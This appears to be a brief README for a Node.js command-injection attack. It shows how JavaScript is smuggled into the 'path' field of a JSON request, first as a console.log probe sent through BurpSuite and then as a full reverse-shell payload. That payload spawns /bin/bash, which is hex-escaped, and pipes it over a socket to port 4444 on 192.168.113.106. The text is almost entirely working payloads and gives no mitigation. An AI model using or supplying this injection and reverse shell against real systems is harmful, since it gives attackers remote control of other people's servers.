# Nodejs-Shell-Injection

Concept:

Vulnerable Json Parameters
```
{
"requests":
  [
    {
    "method":"get","path":"/profile;<injected payload>"
      }
  ]
}
```

Pre-investigation with BurpSuite
```
{
"requests":
  [
    {
    "method":"get","path":"/profile;console.log('INJECTED PAYLOAD');"
      }
  ]
}
```

Inject Reverse Nodejs Shell

```
{
"requests":
  [
    {
    "method":"get","path":"/profile;var net = require('net'),sh = require('child_process').exec('\\x2fbin\\x2fbash'); var client = new net.Socket();client.connect(4444, '192.168.113.106', function() {client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});"
      }
  ]
}
```
